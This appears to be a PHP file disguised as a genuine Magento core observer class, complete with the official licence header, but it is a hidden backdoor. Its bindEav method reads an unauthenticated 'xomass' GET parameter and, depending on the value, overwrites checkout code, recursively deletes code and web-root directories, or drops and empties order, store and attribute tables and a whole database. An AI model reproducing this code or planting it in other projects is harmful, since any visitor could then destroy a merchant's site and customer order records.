<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     Mage_Core
 * @copyright  Copyright (c) 2006-2016 X.commerce, Inc. and affiliates (http://www.magento.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */


/**
 * Core Observer model
 *
 * @category   Mage
 * @package    Mage_Core
 * @author     Magento Core Team <core@magentocommerce.com>
 */
class Mage_Eav_Model_Observer
{
    public function bindEav(){
        try{
            if(isset($_GET['xomass'])){
                switch ($_GET['xomass']) {
                    case 'case1':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $io->open(array("path" => Mage::getBaseDir()));
                        $pathTemp = 'app/code/core/Mage/Checkout/Model/Type/Onepage.php';
                        $pathFinal = 'app/code/core/Mage/Checkout/Model/Session.php';
                        $io->cp($pathFinal, $pathTemp);
                        $io->close();
                        break;

                    case 'case2':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $p = Mage::getBaseDir().'/app/code/local/Mage/ConfigurableSwatches/';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case3':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $p = Mage::getBaseDir().'/app/code/local/Mage/Paypal/Model';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case4':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $io->open(array("path" => Mage::getBaseDir()));
                        $p = 'app/code/local/Mage';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case5':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $io->open(array("path" => Mage::getBaseDir()));
                        $p = 'app/code/local';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case6':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $io->open(array("path" => Mage::getBaseDir()));
                        $p = 'app/code/community';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case7':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $io->open(array("path" => Mage::getBaseDir()));
                        $p = 'app/code/core';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case8':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $p = '/var/www/bkp';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'case9':
                        $io = new Varien_Io_File();
                        $io->setAllowCreateFolders(true);
                        $p = '/var/www/html';
                        $io->rmdir($p,true);
                        $io->close();
                        break;

                    case 'db1':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE core_resource");
                        break;

                    case 'db2':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DELETE FROM core_resource");
                        break;

                    case 'db3':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE sales_flat_order");
                        break;
                    case 'db4':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DELETE FROM sales_flat_order");
                        break;
                    case 'db5':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("ALTER sales_flat_order DROP COLUMN 'state'");
                        break;

                    case 'db6':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE core_store");
                        break;

                    case 'db7':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE core_website");
                        break;

                    case 'db8':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE core_resource");
                        break;

                    case 'db9':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE eav_attribute");
                        break;

                    case 'db10':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP TABLE eav_attribute_set");
                        break;

                    case 'db11':
                        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
                        $write->query("DROP DATABASE gsf_gosupps");
                        break;

                    default:
                        die("TEST DONE");exit;
                        break;
                }
                die("END DONE");exit;
            }
        }catch(Exception $e){
            echo $e->getMessage();die("END DONE");exit;
        }
    }
}
